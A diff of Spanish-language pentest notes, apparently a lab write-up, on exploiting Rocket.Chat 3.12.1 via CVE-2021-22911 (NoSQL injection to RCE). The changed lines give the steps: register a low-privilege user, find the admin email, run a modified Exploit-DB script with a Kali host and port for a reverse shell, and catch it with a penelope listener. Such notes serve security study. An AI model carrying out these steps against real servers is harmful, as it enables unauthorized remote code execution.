@@ -14,10 +14,14 @@ Rocket.Chat es una plataforma de mensajería y colaboración para equipos, parec
 
 ## NoSQL Injection to RCE (Unauthenticated) - Versión 3.12.1
 
+Registrar un usuario para ingresar a la consola. 
+
 * [CVE-2021-22911](https://www.exploit-db.com/exploits/50108)
 
 ```bash 
-Dentro de la aplicación se puede observar el correo del usuario 'admin' el cual es: 'local0ste@domain.local'
+Dentro de la aplicación en la parte 'General' se puede observar el correo del usuario 'admin' el cual es:
+	
+	'local0ste@domain.local'
 ```
 
 ```bash 
@@ -30,16 +34,20 @@ Dentro de la aplicación se puede observar el correo del usuario 'admin' el cual
 ```bash 
 NOTA: El siguiente comando es para un script de python modificado
 
-❯ python 50108-modified.py -t http://IP:3000/ -u 'test@test.com' -U 'test' -p 'test123' -a 'local0ste@domain.local' -A 'localh0ste' -H IP_Kali -P 4446
+❯ python 50108-modified.py -t http://IP:3000/ -u 'test@test.com' -U 'test' -p 'test123' -a 'localh0ste@domain.local' -A 'localh0ste' -H IP_Kali -P 4446
 
-	# -u: correo del usuario con pocos privilegios, sin 2FA.
+	# -t: URL de Rocket.Chat.
+	# -u: correo del usuario con pocos privilegios, sin 2FA. (El creado en Register)
 	# -U: nombre de usuario de esa cuenta.
 	# -p: contraseña de esa cuenta.
 	# -a: correo del administrador.
 	# -A: nombre de usuario del administrador.
-	# -t: URL de Rocket.Chat.
 	# -H: dirección del host para la conexión inversa (IP de Kali)
 	# -P: puerto para la conexión inversa (Puerto en Kali)
+
+
+❯ penelope -p 4446 
+
 
 NOTA:
 	- Si penelope muestra algún tipo de error y da opciones, escoger la 3 o 4 y se obtendra una shell 
